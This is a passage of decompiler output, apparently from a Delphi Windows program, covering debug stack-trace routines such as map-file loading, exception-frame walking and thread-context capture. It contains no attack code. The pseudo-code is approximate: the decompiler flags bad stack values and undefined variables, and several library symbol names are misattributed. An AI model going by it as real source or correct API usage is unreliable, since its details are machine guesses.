      if ( !--v2 )
        return (int)v9;
    }
    __writefsdword(0, v8[0]);
  }
  return (int)v9;
}
// 42F8A9: variable 'v5' is possibly undefined

//----- (0042F910) --------------------------------------------------------
int __fastcall sub_42F910(int a1, int a2)
{
  int v3; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // eax
  int v8; // [esp+Ch] [ebp-8h]

  v8 = 0;
  if ( a2 )
  {
    v3 = *(_DWORD *)(a1 + 4);
    if ( *(_DWORD *)(v3 + 8) - 1 >= 0 )
    {
      v4 = *(_DWORD *)(v3 + 8);
      v5 = 0;
      while ( 1 )
      {
        v6 = sub_42F980(a1, v5);
        if ( *(_DWORD *)(v6 + 4) == a2 )
          break;
        ++v5;
        if ( !--v4 )
          goto LABEL_7;
      }
      v8 = v6;
    }
LABEL_7:
    if ( !v8 )
    {
      v8 = sub_42F870(a1, a2);
      if ( v8 )
        sub_427F40(*(_DWORD **)(a1 + 4), v8);
    }
  }
  return v8;
}

//----- (0042F980) --------------------------------------------------------
int __fastcall sub_42F980(int a1, unsigned int System::AnsiString)
{
  return sub_428060(*(Idthreadcomponent::TIdThreadComponent **)(a1 + 4), System::AnsiString);
}

//----- (0042F9A0) --------------------------------------------------------
int __fastcall sub_42F9A0(int a1, LPCVOID lpAddress, _WORD *a3)
{
  PVOID v5; // eax
  int v6; // ebx
  int v7; // eax

  sub_407D10((int)a3, (int)&byte_42EF78);
  sub_4051B8(a3, 36, 0);
  v5 = sub_42B260(lpAddress);
  v6 = sub_42F910(a1, (int)v5);
  if ( !v6 )
    return 0;
  v7 = sub_407DEC((int)a3, (int)&byte_42EF78);
  return (*(int (__fastcall **)(int, LPCVOID, int))(*(_DWORD *)v6 + 12))(v6, lpAddress, v7);
}
// 42EF78: using guessed type char byte_42EF78;

//----- (0042FA10) --------------------------------------------------------
void sub_42FA10()
{
  if ( !dword_466BC0 )
  {
    dword_466BC0 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TList, 1);
    sub_427F40(dword_466BC0, (int)cls_DebugLocationInfoUtil_TDebugInfoMap);
    sub_427F40(dword_466BC0, (int)cls_DebugLocationInfoUtil_TDebugInfoSymbols);
  }
}
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();
// 42F17C: using guessed type int (*cls_DebugLocationInfoUtil_TDebugInfoMap[4])();
// 42F234: using guessed type int (*cls_DebugLocationInfoUtil_TDebugInfoSymbols[4])();

//----- (0042FA50) --------------------------------------------------------
int sub_42FA50()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax
  _DWORD *v4; // [esp+8h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  v4 = (_DWORD *)(v0 + 8);
  LODWORD(v0) = *(_DWORD *)(v0 + 8);
  *v4 = 0;
  sub_405598((_DWORD *)v0);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0042FAA0) --------------------------------------------------------
int __fastcall sub_42FAA0(int a1, int a2, int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int v8[2]; // [esp-14h] [ebp-2Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v10; // [esp-8h] [ebp-20h]
  int *v11; // [esp-4h] [ebp-1Ch]
  void *v12; // [esp+0h] [ebp-18h]
  unsigned __int8 v13; // [esp+Fh] [ebp-9h]
  int v14; // [esp+10h] [ebp-8h]
  int v15; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v15 = 0;
  v14 = a3;
  sub_407D10(a3, (int)&byte_42EF78);
  v11 = &savedregs;
  v10 = &loc_42FB63;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v5 = (**(int (__fastcall ***)(int, int, _DWORD))a1)(a1, a2, *(_DWORD *)a1);
  v6 = sub_407DEC(v14, (int)&byte_42EF78);
  v13 = sub_42F430(*(int **)(a1 + 8), v5, v6, a1, v5, a2);
  if ( v13 )
  {
    *(_DWORD *)v14 = a2;
    *(_DWORD *)(v14 + 28) = a1;
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
    v8[1] = (unsigned int)&loc_42FB46;
    v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v8);
    sub_427410(*(_DWORD *)(a1 + 4), &v15);
    sub_406FE8((volatile __int32 *)(v14 + 32), v15);
    __writefsdword(0, v8[0]);
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_42FB4D;
    sub_406C44(&v15);
  }
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_42FB6A;
  sub_406C44(&v15);
  return v13;
}
// 42EF78: using guessed type char byte_42EF78;

//----- (0042FB80) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_42FB80@<eax>(int a1@<eax>, int a2@<ebx>)
{
  int v2; // ebx
  int v3; // eax
  unsigned int v5[2]; // [esp-1Ch] [ebp-28h] BYREF
  void **v6; // [esp-14h] [ebp-20h]
  _DWORD v7[4]; // [esp-10h] [ebp-1Ch] BYREF
  int v8; // [esp+0h] [ebp-Ch]
  int v9; // [esp+4h] [ebp-8h] BYREF
  int v10; // [esp+8h] [ebp-4h]
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v7[3] = a2;
  v8 = a1;
  v7[2] = &savedregs;
  v7[1] = &loc_42FC29;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_42FBDD;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_427410(*(_DWORD *)(a1 + 4), &v9);
  Sysutils::ChangeFileExt(v9, L".map");
  __writefsdword(0, v5[0]);
  v6 = (void **)&loc_42FBE4;
  sub_406C44(&v9);
  v2 = sub_426B00(v10);
  if ( (_BYTE)v2 )
  {
    v3 = Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(*(_DWORD *)(v8 + 4));
    *(_DWORD *)(v8 + 8) = v3;
  }
  __writefsdword(0, v9);
  savedregs = &loc_42FC30;
  sub_406CA4((int)&v9, 2);
  return v2;
}
// 42FB80: could not find valid save-restore pair for ebx
// 42FC23: bad sp value at call
// 42CEF0: using guessed type _DWORD __stdcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD);
// 42FC44: using guessed type wchar_t aMap[5];

//----- (0042FC50) --------------------------------------------------------
BOOL __fastcall sub_42FC50(int a1, int a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-3Ch] BYREF
  int *v8; // [esp-14h] [ebp-38h]
  int *v9; // [esp-10h] [ebp-34h]
  unsigned int v10[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v11; // [esp-4h] [ebp-28h]
  HANDLE CurrentProcess; // [esp+4h] [ebp-20h]
  int v13; // [esp+8h] [ebp-1Ch] BYREF
  int v14; // [esp+Ch] [ebp-18h] BYREF
  bool v15; // [esp+13h] [ebp-11h]
  int v16; // [esp+14h] [ebp-10h]
  int v17; // [esp+18h] [ebp-Ch]
  int v18; // [esp+1Ch] [ebp-8h] BYREF
  int v19; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v19 = 0;
  v18 = 0;
  v16 = a3;
  v17 = a2;
  sub_407D10(a3, (int)&byte_42EF78);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_42FD76;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  CurrentProcess = GetCurrentProcess();
  v4 = sub_406C44(&v19);
  v15 = sub_42EC90((int)CurrentProcess, v17, &v13, v4);
  if ( v15 )
  {
    *(_DWORD *)(v16 + 28) = a1;
    *(_DWORD *)v16 = v17;
    v9 = &savedregs;
    v8 = (int *)&loc_42FCF6;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_427410(*(_DWORD *)(a1 + 4), &v18);
    sub_406FE8((volatile __int32 *)(v16 + 32), v18);
    __writefsdword(0, (unsigned int)ExceptionList);
    v9 = (int *)&loc_42FCFD;
    sub_406C44(&v18);
    *(_DWORD *)(v16 + 12) = v13;
    sub_406FE8((volatile __int32 *)(v16 + 8), v19);
  }
  if ( v15 )
  {
    v9 = &v14;
    v8 = &v13;
    v5 = sub_406C44(&v19);
    if ( sub_42EE00((int)CurrentProcess, v17, v5, v9, v8) )
    {
      *(_DWORD *)(v16 + 16) = v14;
      sub_406FE8((volatile __int32 *)(v16 + 24), v19);
      *(_DWORD *)(v16 + 20) = v13;
    }
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_42FD7D;
  sub_406CA4((int)&v18, 2);
  return v15;
}
// 42EF78: using guessed type char byte_42EF78;

//----- (0042FD90) --------------------------------------------------------
char __fastcall sub_42FD90(int a1)
{
  char result; // al
  Idiohandler::TIdIOHandler *CurrentProcess; // esi
  bool v4; // al
  int v5; // [esp+8h] [ebp-8h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  result = sub_42E880();
  if ( result )
  {
    CurrentProcess = (Idiohandler::TIdIOHandler *)GetCurrentProcess();
    v4 = sub_42EBB0((int)CurrentProcess, *(_DWORD *)(a1 + 4), &v6, &v5);
    if ( !v4 )
      v4 = (unsigned __int8)Idiohandler::TIdIOHandler::Write(CurrentProcess, *(_DWORD *)(a1 + 4))
        && sub_42EBB0((int)CurrentProcess, *(_DWORD *)(a1 + 4), &v6, &v5);
    return v4 && v6 && v5 && v5 != 4;
  }
  return result;
}

//----- (0042FE10) --------------------------------------------------------
int __fastcall sub_42FE10(int *a1, char a2, char a3, int *a4)
{
  int v5; // edx
  int v6; // edi
  int v7; // eax
  void *v8; // edi
  signed int v9; // edi
  int v10; // eax
  char v11; // al
  signed int v12; // edi
  unsigned int v14; // [esp-48h] [ebp-B4h]
  _DWORD v15[6]; // [esp-Ch] [ebp-78h] BYREF
  unsigned int v16; // [esp+Ch] [ebp-60h] BYREF
  unsigned int v17; // [esp+10h] [ebp-5Ch] BYREF
  int v18; // [esp+14h] [ebp-58h] BYREF
  int v19; // [esp+18h] [ebp-54h] BYREF
  int v20; // [esp+1Ch] [ebp-50h] BYREF
  int v21; // [esp+20h] [ebp-4Ch] BYREF
  LPCVOID v22; // [esp+24h] [ebp-48h]
  int v23; // [esp+28h] [ebp-44h]
  char *v24; // [esp+2Ch] [ebp-40h]
  char *v25; // [esp+30h] [ebp-3Ch]
  int v26; // [esp+34h] [ebp-38h]
  _DWORD *v27; // [esp+38h] [ebp-34h]
  char v28; // [esp+3Eh] [ebp-2Eh]
  char v29; // [esp+3Fh] [ebp-2Dh]
  int v30[4]; // [esp+40h] [ebp-2Ch] BYREF
  int v31; // [esp+50h] [ebp-1Ch]
  void *v32; // [esp+64h] [ebp-8h] BYREF
  void *v33; // [esp+68h] [ebp-4h] BYREF
  int savedregs; // [esp+6Ch] [ebp+0h] BYREF

  v16 = 0;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v33 = 0;
  v32 = 0;
  v28 = a3;
  v29 = a2;
  sub_407D10((int)v30, (int)&byte_42EF78);
  v15[2] = &savedregs;
  v15[1] = &loc_4300FC;
  v15[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  sub_406C44(a4);
  sub_407030((volatile __int32 *)&v33, a1[2]);
  sub_407968(&v21, (_DWORD *)a1[1], &str__[1]._top);
  if ( sub_407B7C(v21, (int)v33, 1) == 1 )
  {
    v5 = a1[1];
    v6 = v5;
    if ( v5 )
      v6 = *(_DWORD *)(v5 - 4);
    v27 = v33;
    if ( v33 )
      v27 = (_DWORD *)*(v27 - 1);
    v26 = v5;
    if ( v5 )
      v26 = *(_DWORD *)(v26 - 4);
    sub_407AD8((int)v33, v6 + 2, (int)v27 - v26 - 1, &v33);
  }
  else if ( (int)sub_407B7C((int)&str__[1], a1[1], 1) > 1 )
  {
    sub_407030((volatile __int32 *)&v32, a1[1]);
    v7 = sub_407B7C((int)&str__[1], (int)v32, 1);
    sub_407B20((volatile __int32 *)&v32, 1, v7);
    sub_407968(&v20, v32, &str__[1]._top);
    if ( sub_407B7C(v20, (int)v33, 1) == 1 )
    {
      v8 = v32;
      if ( v32 )
        v8 = (void *)*((_DWORD *)v32 - 1);
      v25 = (char *)v33;
      if ( v33 )
        v25 = (char *)*((_DWORD *)v25 - 1);
      v24 = (char *)v32;
      if ( v32 )
        v24 = (char *)*((_DWORD *)v24 - 1);
      sub_407AD8((int)v33, (int)v8 + 2, v25 - v24 - 1, &v33);
    }
  }
  if ( a1[1] )
    sub_4079F0(a4, 3);
  sub_407910(a4, v33);
  v9 = a1[4];
  if ( v9 > 0 )
  {
    sub_415150(v9, &v19);
    sub_4079F0(a4, 6);
    v30[0] = 0;
    if ( v28 )
    {
      v23 = *a1;
      v22 = (LPCVOID)(v23 - a1[3]);
      v10 = sub_407DEC((int)v30, (int)&byte_42EF78);
      v11 = sub_42F2D0(v22, v10);
    }
    else
    {
      v11 = 0;
    }
    if ( v11 && v31 > 0 )
    {
      sub_415150(a1[4] - v31, &v18);
      sub_4079F0(a4, 3);
    }
    sub_407910(a4, dword_43017C);
    if ( v29 )
    {
      v12 = a1[5];
      if ( v12 < 0 )
      {
        sub_4154B0(-v12, 1, (int *)&v16);
        v14 = v16;
      }
      else
      {
        sub_4154B0(v12, 1, (int *)&v17);
        v14 = v17;
      }
      sub_4079F0(a4, 3);
    }
  }
  __writefsdword(0, v14);
  sub_406CA4((int)&v16, 6);
  sub_407DEC((int)v30, (int)&byte_42EF78);
  return sub_406CA4((int)&v32, 2);
}
// 4300CB: variable 'v14' is possibly undefined
// 42EF78: using guessed type char byte_42EF78;
// 430110: using guessed type _strings str__[1];
// 43017C: using guessed type int dword_43017C[4];

//----- (004301B0) --------------------------------------------------------
_DWORD *sub_4301B0()
{
  _DWORD *v0; // eax
  Idthreadcomponent::TIdThreadComponent *v1; // eax
  _DWORD *v2; // eax
  _DWORD *result; // eax

  if ( !++dword_46ED9C )
  {
    v0 = (_DWORD *)dword_466BB8;
    dword_466BB8 = 0;
    sub_405598(v0);
    v1 = dword_466BC0;
    dword_466BC0 = 0;
    sub_405598(v1);
    v2 = (_DWORD *)dword_466BBC;
    dword_466BBC = 0;
    return sub_405598(v2);
  }
  return result;
}
// 466BBC: using guessed type int dword_466BBC;
// 46ED9C: using guessed type int dword_46ED9C;

//----- (00430720) --------------------------------------------------------
int __fastcall sub_430720(int a1)
{
  int v1; // ebx

  if ( *(_BYTE *)a1 == 0xE9 )
  {
    v1 = a1 + *(_DWORD *)(a1 + 1) + 5;
  }
  else if ( *(_BYTE *)a1 == 0xEB )
  {
    v1 = a1 + *(char *)(a1 + 1) + 2;
  }
  else
  {
    v1 = 0;
  }
  if ( v1 && *(_WORD *)v1 == 9727 && !IsBadReadPtr(*(const void **)(v1 + 2), 4u) )
    return **(_DWORD **)(v1 + 2);
  return v1;
}

//----- (00430790) --------------------------------------------------------
int *__fastcall sub_430790(int a1)
{
  int *v1; // ebx

  v1 = (int *)Dbxplatformutil::TDBXTokenizer::TDBXTokenizer(&cls_DebugStackInfoUtil_TExceptFrameList, 1, a1);
  sub_431AD0(dword_466BD8, v1);
  return v1;
}
// 43056C: using guessed type __int16 cls_DebugStackInfoUtil_TExceptFrameList;
// 431710: using guessed type int __fastcall Dbxplatformutil::TDBXTokenizer::TDBXTokenizer(_DWORD, _DWORD, _DWORD);
// 466BD8: using guessed type int dword_466BD8;

//----- (004307C0) --------------------------------------------------------
int *__userpurge sub_4307C0@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>, long double a4@<st0>, int a5)
{
  int *v5; // ebx

  v5 = (int *)sub_430B20((int)&cls_DebugStackInfoUtil_TStackInfoList, 1, a1, a4, 0, a5, a3, a2);
  sub_431AD0(dword_466BD8, v5);
  return v5;
}
// 4303A4: using guessed type __int16 cls_DebugStackInfoUtil_TStackInfoList;
// 466BD8: using guessed type int dword_466BD8;

//----- (00430800) --------------------------------------------------------
int *__userpurge sub_430800@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>, long double a4@<st0>, int a5, int a6)
{
  int *v6; // ebx

  v6 = (int *)sub_430B20((int)&cls_DebugStackInfoUtil_TStackInfoList, 1, a1, a4, a5, a6, a3, a2);
  sub_431AD0(dword_466BD8, v6);
  return v6;
}
// 4303A4: using guessed type __int16 cls_DebugStackInfoUtil_TStackInfoList;
// 466BD8: using guessed type int dword_466BD8;

//----- (00430840) --------------------------------------------------------
int sub_430840()
{
  int CurrentThreadId_0; // eax

  CurrentThreadId_0 = GetCurrentThreadId_0();
  return sub_431C40(dword_466BD8, CurrentThreadId_0);
}
// 466BD8: using guessed type int dword_466BD8;

//----- (00430860) --------------------------------------------------------
int sub_430860()
{
  int CurrentThreadId_0; // eax

  CurrentThreadId_0 = GetCurrentThreadId_0();
  return sub_431C20(dword_466BD8, CurrentThreadId_0);
}
// 466BD8: using guessed type int dword_466BD8;

//----- (00430880) --------------------------------------------------------
int __usercall sub_430880@<eax>(int a1@<eax>, unsigned __int8 a2@<dl>, int a3@<ebx>, int a4@<edi>)
{
  int v5; // eax

  v5 = sub_430860();
  LOBYTE(a3) = v5 != 0;
  if ( v5 )
    sub_431130(v5, a1, a2, a4);
  return a3;
}

//----- (004308B0) --------------------------------------------------------
int __usercall sub_4308B0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int v5; // eax

  v5 = sub_430840();
  LOBYTE(a3) = v5 != 0;
  if ( v5 )
    sub_431760(v5, a1, a2);
  return a3;
}
// 431760: using guessed type int __fastcall sub_431760(_DWORD, _DWORD, _DWORD);

//----- (004308E0) --------------------------------------------------------
int __fastcall sub_4308E0(int a1)
{
  int v1; // ebx
  char v3[4]; // [esp+4h] [ebp-20h] BYREF
  int v4; // [esp+8h] [ebp-1Ch]
  int v5; // [esp+20h] [ebp-4h] BYREF

  v1 = 0;
  if ( *off_4681D0 )
  {
    v5 = 0;
    if ( ((int (__stdcall *)(int, _DWORD, char *, int, int *))*off_4681D0)(a1, 0, v3, 28, &v5) >= 0 && v5 == 28 )
      return *(_DWORD *)(v4 + 4);
  }
  return v1;
}
// 4681D0: using guessed type int *off_4681D0;
// 4308E0: using guessed type char var_20[4];

//----- (00430930) --------------------------------------------------------
int *__usercall sub_430930@<eax>(char a1@<al>, HANDLE hThread@<edx>, long double a3@<st0>)
{
  LPCONTEXT v5; // edi
  unsigned int v7[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v8; // [esp-4h] [ebp-30h]
  int v9; // [esp+Ch] [ebp-20h]
  int Ebp; // [esp+10h] [ebp-1Ch]
  int Eip; // [esp+14h] [ebp-18h]
  LPCONTEXT lpContext; // [esp+18h] [ebp-14h]
  int v13; // [esp+1Ch] [ebp-10h]
  int v14; // [esp+20h] [ebp-Ch]
  int v15; // [esp+24h] [ebp-8h]
  int *v16; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v16 = 0;
  v15 = System::AllocMem(0x2DBu);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4309DE;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v14 = v15;
  if ( (v15 & 0xF) != 0 )
  {
    v13 = v15;
    lpContext = (LPCONTEXT)((v15 + 16) & 0xFFFFFFF0);
    v5 = lpContext;
  }
  else
  {
    v5 = (LPCONTEXT)v15;
  }
  v5->ContextFlags = 65543;
  if ( GetThreadContext(hThread, v5) )
  {
    Eip = v5->Eip;
    Ebp = v5->Ebp;
    v9 = sub_4308E0((int)hThread);
    v16 = sub_430800(a1, -1, Eip, a3, v9, Ebp);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4309E5;
  System::__linkproc__ FreeMem(v15);
  return v16;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (004309F0) --------------------------------------------------------
int *__usercall sub_4309F0@<eax>(char a1@<al>, DWORD dwThreadId@<edx>, long double a3@<st0>)
{
  unsigned int v5[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v6; // [esp-4h] [ebp-10h]
  HANDLE hObject; // [esp+4h] [ebp-8h]
  int *v8; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v8 = 0;
  hObject = OpenThread(0x48u, 0, dwThreadId);
  if ( hObject )
  {
    v6 = &savedregs;
    v5[1] = (unsigned int)&loc_430A43;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    v8 = sub_430930(a1, hObject, a3);
    __writefsdword(0, v5[0]);
    v6 = (int *)&loc_430A4A;
    CloseHandle_0(hObject);
  }
  return v8;
}

//----- (00430A60) --------------------------------------------------------
int __usercall sub_430A60@<eax>(int a1@<eax>, char a2@<dl>, long double a3@<st0>)
{
  char v3; // bl
  int v4; // esi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v3 = a2;
  v4 = a1;
  *(_DWORD *)(a1 + 4) = sub_42B770((int)&cls_DebugSysUtil_TObjectList, 1, 1);
  *(_DWORD *)(v4 + 8) = GetCurrentThreadId_0();
  Sysutils::Now();
  *(double *)(v4 + 16) = a3;
  if ( v3 )
    System::__linkproc__ AfterConstruction(v4);
  return v4;
}
// 430A71: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 42B0C8: using guessed type __int16 cls_DebugSysUtil_TObjectList;

//----- (00430AC0) --------------------------------------------------------
int sub_430AC0()
{
  __int64 v0; // rax
  int v1; // ebx
  _DWORD *v2; // eax
  int result; // eax
  char v4; // [esp+Bh] [ebp-1h]

  v0 = System::__linkproc__ BeforeDestruction();
  v4 = BYTE4(v0);
  v1 = v0;
  if ( *(_WORD *)(v0 + 26) )
    (*(void (__fastcall **)(_DWORD, _DWORD))(v0 + 24))(*(_DWORD *)(v0 + 28), v0);
  v2 = *(_DWORD **)(v1 + 4);
  *(_DWORD *)(v1 + 4) = 0;
  sub_405598(v2);
  result = sub_405588();
  if ( v4 > 0 )
    return System::__linkproc__ ClassDestroy(v1);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (00430B20) --------------------------------------------------------
int __userpurge sub_430B20@<eax>(
        int a1@<eax>,
        char a2@<dl>,
        char a3@<cl>,
        long double a4@<st0>,
        int a5,
        int a6,
        int a7,
        int a8)
{
  int v8; // ebx
  int v9; // eax
  char v11; // [esp+1Ah] [ebp-2h]
  char v12; // [esp+1Bh] [ebp-1h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v11 = a3;
  v12 = a2;
  v8 = a1;
  sub_430A60(a1, 0, a4);
  *(_DWORD *)(v8 + 32) = a8;
  *(_BYTE *)(v8 + 52) = v11;
  *(_DWORD *)(v8 + 40) = a6;
  *(_DWORD *)(v8 + 56) = 0;
  *(_DWORD *)(v8 + 60) = 0;
  *(_DWORD *)(v8 + 44) = a6;
  if ( a5 )
    *(_DWORD *)(v8 + 36) = a5;
  else
    *(_DWORD *)(v8 + 36) = sub_42B240();
  *(_DWORD *)(v8 + 48) = sub_42C240(a7);
  if ( a7 )
  {
    v9 = sub_405568((int)&cls_DebugStackInfoUtil_TStackInfoItem, 1);
    *(_DWORD *)(v9 + 4) = a7;
    sub_427F40(*(_DWORD **)(*(_DWORD *)(v8 + 4) + 4), v9);
  }
  if ( *(_BYTE *)(v8 + 52) )
  {
    sub_431050((int *)v8);
    *(_DWORD *)(v8 + 64) = sub_430B20(a5, a6, a7, a8);
  }
  else
  {
    sub_430FC0(v8);
  }
  if ( v12 )
    System::__linkproc__ AfterConstruction(v8);
  return v8;
}
// 430B35: variable 'a3' is possibly undefined
// 430B38: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4302F8: using guessed type __int16 cls_DebugStackInfoUtil_TStackInfoItem;

//----- (00430C10) --------------------------------------------------------
int sub_430C10()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  _DWORD *v3; // eax
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_42C250((_DWORD **)(v0 + 48));
  v3 = *(_DWORD **)(v2 + 64);
  *(_DWORD *)(v2 + 64) = 0;
  sub_405598(v3);
  result = sub_430AC0();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (00430C60) --------------------------------------------------------
char __fastcall sub_430C60(int a1, unsigned int **a2, _DWORD *a3)
{
  unsigned int v5; // edi
  unsigned int v7; // eax
  char *v8; // [esp+30h] [ebp-10h]
  unsigned int v9; // [esp+34h] [ebp-Ch]
  int v10; // [esp+38h] [ebp-8h] BYREF
  _DWORD *v11; // [esp+3Ch] [ebp-4h]

  v11 = a3;
  v5 = a3[2];
  while ( 1 )
  {
    sub_42B250();
    if ( !sub_430FB0(a1, v7) )
      break;
    v9 = **a2;
    if ( v5 >= v9 )
      break;
    v5 = **a2;
    v8 = (char *)(*a2)[1];
    if ( sub_42C520(*(_DWORD *)(a1 + 48), v8) && sub_430FB0(a1, v9 + *(_DWORD *)(a1 + 56)) )
    {
      ++v11[1];
      v11[6] = *a2;
      v11[5] = *a2 + 2;
      if ( v9 > v11[2] )
      {
        v11[2] = v9;
        *v11 = sub_430DD0(a1, (unsigned int)v8, &v10, a1) ? &v8[-v10] : v8;
        if ( (unsigned int)*a2 <= (__int64)(v9 + *(_QWORD *)(a1 + 56)) )
        {
          v11[3] = v9 + *(_DWORD *)(a1 + 56) - (_DWORD)*a2;
          v11[4] = (unsigned int)(v11[3] - 8) >> 2;
          if ( *a2 != (unsigned int *)(*(_DWORD *)(a1 + 56) + **a2) )
          {
            *a2 = (unsigned int *)(*(_DWORD *)(a1 + 56) + v9);
            return 1;
          }
        }
      }
      return 0;
    }
    *a2 = (unsigned int *)(v9 + *(_DWORD *)(a1 + 56));
  }
  return 0;
}
// 430DAC: variable 'v7' is possibly undefined

//----- (00430DD0) --------------------------------------------------------
BOOL __usercall sub_430DD0@<eax>(int a1@<eax>, unsigned int a2@<edx>, _DWORD *a3@<ecx>, BOOL a4@<ebx>)
{
  int *v4; // esi
  BOOL v5; // eax
  int v6; // esi
  int v7; // edi
  char v8; // al
  unsigned int v10[9]; // [esp-Ch] [ebp-30h] BYREF
  char v11; // [esp+1Ah] [ebp-Ah]
  char v12; // [esp+1Bh] [ebp-9h]
  int *v13; // [esp+1Ch] [ebp-8h]
  _DWORD *v14; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = a3;
  LOBYTE(a4) = a2 > 8;
  if ( a2 > 8 )
  {
    v10[8] = a2 - 8;
    v4 = (int *)(a2 - 8);
    v10[7] = a2 - 4;
    v13 = (int *)(a2 - 4);
    v10[6] = a2 - 8;
    v5 = sub_42C520(*(_DWORD *)(a1 + 48), (const void *)(a2 - 8)) && !IsBadReadPtr(v4, 8u);
    a4 = v5;
    if ( v5 )
    {
      v10[2] = (unsigned int)&savedregs;
      v10[1] = (unsigned int)&loc_430F8D;
      v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v10);
      v6 = *v4;
      v7 = *v13;
      v8 = HIBYTE(*v13) & 7;
      v12 = v8;
      v11 = HIBYTE(v6) & 7;
      if ( (v6 & 0xFF000000) == -402653184 )
      {
        *v14 = 5;
      }
      else if ( (v7 & 0xF8FF0000) == 285147136 && (unsigned __int8)(v8 - 4) >= 2u )
      {
        *v14 = 2;
      }
      else if ( (v7 & 0xF8FF0000) == -788594688 )
      {
        *v14 = 2;
      }
      else if ( (v7 & 0xFFFF00) == 1376000 )
      {
        *v14 = 3;
      }
      else if ( (v7 & 0xF8FF00) != 5308160 || v12 == 4 )
      {
        if ( (unsigned __int16)v7 == 21759 )
        {
          *v14 = 4;
        }
        else if ( (v6 & 0xFFFF0000) == 369033216 )
        {
          *v14 = 6;
        }
        else if ( (v6 & 0xF8FF0000) != -1862336512 || v11 == 4 )
        {
          if ( (v6 & 0xFFFF00) == 9764608 )
          {
            *v14 = 7;
          }
          else if ( (v6 & 0xFF00) == 39424 )
          {
            *v14 = 7;
          }
          else
          {
            a4 = 0;
          }
        }
        else
        {
          *v14 = 6;
        }
      }
      else
      {
        *v14 = 3;
      }
      __writefsdword(0, v10[0]);
    }
  }
  return a4;
}

//----- (00430FB0) --------------------------------------------------------
bool __fastcall sub_430FB0(int a1, unsigned int a2)
{
  return a2 > *(_DWORD *)(a1 + 40) && a2 < *(_DWORD *)(a1 + 36);
}

//----- (00430FC0) --------------------------------------------------------
char __fastcall sub_430FC0(int a1)
{
  int v2; // eax
